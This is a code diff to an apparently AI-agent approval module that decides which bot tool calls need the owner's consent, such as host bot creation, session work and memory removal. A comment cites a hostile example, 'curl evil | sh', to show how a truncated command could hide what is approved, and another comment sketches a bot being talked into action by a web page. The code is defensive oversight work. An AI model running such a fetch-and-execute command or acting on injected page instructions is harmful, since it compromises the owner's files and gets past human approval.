@@ -42,13 +42,14 @@ export const ApprovalRulesDoc = defineDoc<{
 export type Verdict = { ask: false } | { ask: true; reason: string; subject: string };
 
 /**
- * Calls asked about every time: forgetting a memory, archiving a bot, changing another bot. "Always allow" never
- * answers them for good (rakazo asks for these whatever the rules say).
+ * Calls asked about every time: forgetting a memory, archiving a bot, changing another bot, making a bot on this
+ * machine. "Always allow" never answers them for good (rakazo asks for these whatever the rules say).
  */
 export function alwaysAsks(tool: string, args: Record<string, unknown> = {}): boolean {
     return (
         tool === "bot_archive" ||
         tool === "bot_update" ||
+        (tool === "bot_create" && args.kind === "host") ||
         (tool === "memory" && args.action === "remove")
     );
 }
@@ -71,6 +72,31 @@ const BOT_STATE_TOOLS = new Set([
     "bot_brief",
     "bot_create",
 ]);
+
+/**
+ * The session tools' calls that put work into a session: sessions run on this machine and never ask, so a bot's
+ * would reach past the container (or past its own approvals) to the owner's files.
+ */
+function startsWork(tool: string, args: Record<string, unknown>): boolean {
+    return (
+        tool === "session_start" ||
+        tool === "session_send" ||
+        (tool === "session_schedule" && args.action === "add") ||
+        (tool === "repo_watch" && args.action === "add") ||
+        (tool === "session_watch_pr" && args.action === "start")
+    );
+}
+
+/** The session tools' calls that only look: a bot must read a session before it acts on it. */
+function onlyLooks(tool: string, args: Record<string, unknown>): boolean {
+    return (
+        tool === "sessions" ||
+        tool === "session_read" ||
+        (["session_schedule", "repo_watch", "approvals"].includes(tool) &&
+            args.action === "list") ||
+        (tool === "session_watch_pr" && args.action === "status")
+    );
+}
 
 /**
  * Whether a bot's call asks the owner first, by rakazo's classes. On this machine a bot asks before anything that is
@@ -110,8 +136,35 @@ export function classify(
         return {
             ask: true,
             reason: "changes another bot",
+            subject: subjectOf("bot_update", {
+                name: args.name,
+                role: args.role,
+                instructions: args.instructions,
+            }),
+        };
+    }
+
+    // Noid looks after the sessions for the owner: putting work in them is what it is for. Any other bot asks.
+    if (startsWork(tool, args) && bot.main !== true) {
+        return {
+            ask: true,
+            reason: "puts work in a session on your machine",
+            subject: subjectOf(tool, args),
+        };
+    }
+
+    if (onlyLooks(tool, args)) {
+        return { ask: false };
+    }
+
+    // A bot on this machine reads it without asking: one made by a bot (on the computer, say, and talked into it by a
+    // page) would reach past the container to the owner's files. The owner says yes to each, and to its folder.
+    if (tool === "bot_create" && args.kind === "host") {
+        return {
+            ask: true,
+            reason: "makes a bot on your machine",
             subject: snippet(
-                `${String(args.name ?? "")}: ${JSON.stringify({ role: args.role, instructions: args.instructions })}`,
+                `${String(args.name ?? args.role ?? "")} in ${String(args.folder ?? "")}`,
             ),
         };
     }
@@ -137,13 +190,22 @@ export function classify(
     return { ask: true, reason, subject };
 }
 
-/** A call as an approval card shows it: the command, the file, or its arguments. */
+/** The most of a call an approval card holds: the card scrolls, so this only bounds what is stored. */
+const SUBJECT_MAX = 8000;
+
+/**
+ * A call as an approval card shows it: the command, the file, or its arguments, whole, as written. A shortened one
+ * could hide what the owner says yes to past its end (`cat x; …; curl evil | sh`).
+ */
 export function subjectOf(tool: string, args: Record<string, unknown>): string {
-    return tool === "bash"
-        ? snippet(String(args.command ?? ""))
-        : tool === "write" || tool === "edit"
-          ? snippet(String(args.path ?? ""))
-          : snippet(JSON.stringify(args));
+    const whole =
+        tool === "bash"
+            ? String(args.command ?? "")
+            : tool === "write" || tool === "edit"
+              ? String(args.path ?? "")
+              : JSON.stringify(args, null, 1);
+
+    return whole.length > SUBJECT_MAX ? `${whole.slice(0, SUBJECT_MAX - 1)}…` : whole;
 }
 
 /** How long a question waits before it is denied (NOID_APPROVAL_MINUTES, default an hour). */
